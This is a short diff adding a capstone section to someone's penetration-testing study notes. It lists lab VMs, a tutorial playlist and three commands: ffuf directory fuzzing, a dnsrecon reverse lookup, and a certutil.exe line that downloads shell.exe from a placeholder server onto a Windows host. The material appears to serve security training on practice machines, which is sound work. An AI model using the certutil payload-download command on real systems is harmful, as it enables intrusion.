@@ -142,6 +142,15 @@ password spraying - using known usernames against unknown passwd
 
 
 
+#New Capstone
+- Download machines for vm
+       -Blue, Academy, Dev, Butler, Blackpearl
+- Pentesting for noobs HTB series
+       - https://www.youtube.com/watch?v=JZN3JhoAdWo&list=PLLKT__MCUeiyxF54dBIkzEXT7h8NgqQUB
+ffuf -w wordlistpath:FUZZ -u http://10.10.4.4/FUZZ
+certutil.exe -urlcache -f http://serverip/shell.exe shell.exe
+dnsrecon -r 127.0.0.0/24 -n myip -d domain
+
 
 
 
